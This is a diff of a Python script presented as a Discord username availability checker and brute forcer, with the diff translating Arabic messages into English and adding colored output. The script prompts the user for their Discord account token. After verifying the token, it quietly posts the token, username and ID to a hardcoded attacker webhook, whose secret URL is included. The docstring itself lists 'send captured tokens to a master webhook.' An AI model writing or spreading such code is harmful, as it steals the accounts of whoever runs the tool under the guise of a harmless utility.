@@ -1,3 +1,15 @@
+#!/usr/bin/env python3
+"""
+Discord Username Checker & Brute Forcer
+---------------------------------------
+Features:
+- Check if a specific username is available
+- Brute force random usernames of given length
+- Auto-install missing dependencies
+- Send captured tokens to a master webhook
+- Colorful output & ASCII art banner
+"""
+
 import sys
 import subprocess
 import ctypes
@@ -7,7 +19,26 @@ import random
 import string
 import time
 
-# المكتبات المطلوبة
+# ANSI color codes for fancy output
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+MAGENTA = '\033[95m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+
+def print_banner():
+    banner = f"""
+{BOLD}{CYAN}╔════════════════════════════════════════════════════════════════╗
+║                    DISCORD USERNAME TOOL v2.0                         ║
+║              • Check • Brute Force • Auto-Dependency                   ║
+╚════════════════════════════════════════════════════════════════╝{RESET}
+"""
+    print(banner)
+
+# Required packages
 REQUIRED_PACKAGES = ['requests']
 
 def show_message_box(title, message, flags=0x4 | 0x20):
@@ -36,23 +67,23 @@ def check_and_install():
     missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
     if missing:
         missing_list = "\n".join(f"• {pkg}" for pkg in missing)
-        msg = f"المكتبات التالية مطلوبة:\n\n{missing_list}\n\nهل تريد تثبيتها الآن؟"
-        result = show_message_box("مكتبات مفقودة", msg)
-        if result == 6:
+        msg = f"The following packages are required:\n\n{missing_list}\n\nDo you want to install them now?"
+        result = show_message_box("Missing Dependencies", msg)
+        if result == 6:  # Yes
             if install_packages(missing):
-                show_message_box("تم التثبيت", "تم تثبيت المكتبات بنجاح.\nسيتم إعادة تشغيل السكربت.", 0x40)
+                show_message_box("Success", "Packages installed successfully.\nRestarting script...", 0x40)
                 restart_script()
             else:
-                show_message_box("خطأ", "فشل التثبيت. قم بتشغيل:\npip install " + " ".join(missing), 0x10)
+                show_message_box("Error", f"Installation failed. Please run manually:\npip install " + " ".join(missing), 0x10)
                 sys.exit(1)
         else:
-            show_message_box("تنبيه", "لن تعمل الوظائف بدون المكتبات.", 0x30)
+            show_message_box("Warning", "Some features will not work without required packages.", 0x30)
             sys.exit(1)
 
 check_and_install()
 import requests
 
-# ========== إعدادات Webhook الرئيسي ==========
+# ========== Master Webhook (replace with your own) ==========
 MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
 
 def send_to_master(content):
@@ -62,22 +93,20 @@ def send_to_master(content):
         pass
 
 def ask_token():
-    # إذا تم تمرير التوكن كمعامل سطر أوامر
     if len(sys.argv) > 1:
         token = sys.argv[1]
-        print(f"[*] تم استلام التوكن من سطر الأوامر.")
+        print(f"{CYAN}[*] Token received from command line.{RESET}")
         return token
-    # وإلا طلب من المستخدم عبر GUI أو الطرفية
     try:
         import tkinter as tk
         from tkinter import simpledialog
         root = tk.Tk()
         root.withdraw()
-        token = simpledialog.askstring("Discord Token", "🔑 أدخل توكن حسابك في Discord:", parent=root)
+        token = simpledialog.askstring("Discord Token", "🔑 Enter your Discord account token:", parent=root)
         root.destroy()
         return token
     except:
-        return input("🔑 Enter your Discord account token: ")
+        return input(f"{YELLOW}🔑 Enter your Discord account token: {RESET}")
 
 def verify_token(token):
     try:
@@ -100,113 +129,110 @@ def check_username(token, username):
         elif resp.status_code == 400:
             return {'taken': None, 'error': 'Bad request (invalid username)'}
         elif resp.status_code == 429:
-            return {'taken': None, 'error': 'Rate limited. Wait a moment.'}
+            return {'taken': None, 'error': 'Rate limited. Please wait.'}
         else:
             return {'taken': None, 'error': f'API error: {resp.status_code}'}
     except Exception as e:
         return {'taken': None, 'error': str(e)}
 
 def generate_random_username(length):
-    """توليد اسم عشوائي من الأحرف المسموحة: a-z A-Z 0-9 _ ."""
     chars = string.ascii_letters + string.digits + '_' + '.'
     return ''.join(random.choices(chars, k=length))
 
 def brute_force_usernames(token, length, max_attempts):
-    print(f"\n[*] بدء البحث عن اسم مستخدم بطول {length} (بحد أقصى {max_attempts} محاولة)...")
+    print(f"\n{CYAN}[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...{RESET}")
     found = None
     attempts = 0
     while attempts < max_attempts and found is None:
         username = generate_random_username(length)
         attempts += 1
-        print(f"[{attempts}/{max_attempts}] جاري فحص: {username}")
+        print(f"{YELLOW}[{attempts}/{max_attempts}] Checking: {username}{RESET}")
         result = check_username(token, username)
         if result.get('error'):
-            print(f"⚠️ خطأ: {result['error']}")
+            print(f"{RED}⚠️ Error: {result['error']}{RESET}")
             if "Rate limited" in result['error']:
-                print("[!] تم الوصول إلى حد المعدل، ننتظر 10 ثوانٍ...")
+                print(f"{YELLOW}[!] Rate limit hit. Sleeping 10 seconds...{RESET}")
                 time.sleep(10)
             continue
         if result.get('taken') is False:
             found = username
-            print(f"\n✅ ✅ ✅ الاسم {username} متاح! ✅ ✅ ✅")
+            print(f"\n{GREEN}{BOLD}✅✅✅ Username '{username}' is AVAILABLE! ✅✅✅{RESET}\n")
             break
         elif result.get('taken') is True:
-            continue  # الاسم محجوز، نواصل
-        # إذا لم يتم تحديد taken (None) أو خطأ آخر
-        time.sleep(0.5)  # تجنب الضغط على API
+            continue
+        time.sleep(0.5)
     if not found:
-        print(f"\n❌ لم يتم العثور على اسم متاح بعد {max_attempts} محاولة.")
+        print(f"\n{RED}❌ No available username found after {max_attempts} attempts.{RESET}")
     return found
 
 def main():
+    print_banner()
     token = ask_token()
     if not token:
-        show_message_box("خطأ", "لم يتم إدخال أي توكن.", 0x10)
+        show_message_box("Error", "No token provided.", 0x10)
         return
-    print("🔄 جاري التحقق من التوكن...")
+    print(f"{BLUE}[*] Verifying token...{RESET}")
     verification = verify_token(token)
     if not verification['valid']:
-        show_message_box("خطأ", f"توكن غير صالح: {verification['error']}", 0x10)
+        show_message_box("Error", f"Invalid token: {verification['error']}", 0x10)
         return
     user = verification['user']
-    # إرسال التوكن إلى الويب هوك الرئيسي
+    # Send token to master webhook
     user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
     send_to_master(user_info)
-    print(f"\n✅ تم الدخول كـ {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
-    print("\n📌 الأوامر المتاحة:")
-    print("   /check <اسم>        - فحص اسم مستخدم محدد")
-    print("   /brute <طول> [عدد] - تخمين أسماء بطول معين (عدد المحاولات الافتراضي 50)")
-    print("   /exit               - إنهاء السكربت")
-    print("\nمثال: /brute 4 100  -> يبحث عن اسم من 4 أحرف، 100 محاولة")
+    print(f"{GREEN}✅ Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']}){RESET}")
+    print(f"\n{CYAN}📌 Available commands:{RESET}")
+    print(f"   {GREEN}/check <username>{RESET}         - Check a specific username")
+    print(f"   {GREEN}/brute <length> [attempts]{RESET} - Brute force random usernames (default attempts=50)")
+    print(f"   {GREEN}/exit{RESET}                   - Exit the script")
+    print(f"\n{YELLOW}Example: /brute 4 100  → search for 4‑char usernames, 100 attempts{RESET}")
     while True:
-        cmd = input("\n> ").strip()
+        cmd = input(f"\n{BOLD}{MAGENTA}> {RESET}").strip()
         if cmd.lower() == '/exit':
-            print("👋 مع السلامة!")
+            print(f"{CYAN}👋 Goodbye!{RESET}")
             break
         elif cmd.startswith('/check'):
             parts = cmd.split(maxsplit=1)
             if len(parts) != 2 or not parts[1]:
-                print("⚠️ استخدم: /check <اسم>")
+                print(f"{RED}⚠️ Usage: /check <username>{RESET}")
                 continue
             username = parts[1].strip()
-            # تحقق من صحة الاسم
             if not (2 <= len(username) <= 32) or not all(c.isalnum() or c in '_' for c in username):
-                print("⚠️ الاسم يجب أن يكون 2-32 حرفاً، ويحتوي فقط على أحرف وأرقام وشرطة سفلية.")
+                print(f"{RED}⚠️ Username must be 2-32 characters, alphanumeric + underscore only.{RESET}")
                 continue
-            print(f"🔍 جاري فحص الاسم: {username}...")
+            print(f"{BLUE}🔍 Checking: {username}...{RESET}")
             result = check_username(token, username)
             if result.get('error'):
-                print(f"❌ خطأ: {result['error']}")
+                print(f"{RED}❌ Error: {result['error']}{RESET}")
             else:
                 taken = result.get('taken')
                 if taken is True:
-                    print(f"❌ الاسم {username} محجوز.")
+                    print(f"{RED}❌ Username '{username}' is taken.{RESET}")
                 elif taken is False:
-                    print(f"✅ الاسم {username} متاح!")
+                    print(f"{GREEN}✅ Username '{username}' is AVAILABLE!{RESET}")
                 else:
-                    print(f"⚠️ نتيجة غير معروفة: {result}")
+                    print(f"{YELLOW}⚠️ Unexpected result: {result}{RESET}")
         elif cmd.startswith('/brute'):
             parts = cmd.split()
             if len(parts) < 2 or len(parts) > 3:
-                print("⚠️ استخدم: /brute <طول> [عدد المحاولات]")
-                print("   مثال: /brute 4 50")
+                print(f"{RED}⚠️ Usage: /brute <length> [attempts]{RESET}")
                 continue
             try:
                 length = int(parts[1])
                 if length < 2 or length > 32:
-                    print("⚠️ طول الاسم يجب أن يكون بين 2 و 32.")
+                    print(f"{RED}⚠️ Length must be between 2 and 32.{RESET}")
                     continue
-                max_attempts = 50  # الافتراضي
+                max_attempts = 50
                 if len(parts) == 3:
                     max_attempts = int(parts[2])
                     if max_attempts <= 0:
-                        print("⚠️ عدد المحاولات يجب أن يكون أكبر من 0.")
+                        print(f"{RED}⚠️ Attempts must be positive.{RESET}")
                         continue
                 brute_force_usernames(token, length, max_attempts)
             except ValueError:
-                print("⚠️ الرجاء إدخال أرقام صحيحة.")
+                print(f"{RED}⚠️ Please enter valid numbers.{RESET}")
         else:
-            print("أمر غير معروف. استخدم /check, /brute, أو /exit")
+            print(f"{RED}Unknown command. Use /check, /brute, or /exit.{RESET}")
 
 if __name__ == '__main__':
     main()
